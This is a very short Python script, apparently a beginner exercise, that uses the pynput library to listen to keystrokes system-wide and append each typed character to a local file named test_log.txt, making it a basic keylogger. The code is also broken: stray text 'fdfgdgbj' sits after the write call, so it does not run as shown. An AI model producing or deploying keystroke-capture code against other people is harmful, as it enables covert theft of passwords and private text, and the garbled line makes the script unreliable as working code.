from pynput import keyboard

def Keypressed(key):
    print(str(key))
    with open("test_log.txt",'a') as logkey:

        try:
            char =key.char
            logkey.write(char)fdfgdgbj
        except:
            print("Error getting charecter")
if __name__=="__main__":
    listner = keyboard.Listener(on_press=Keypressed)
    listner.start()
    input()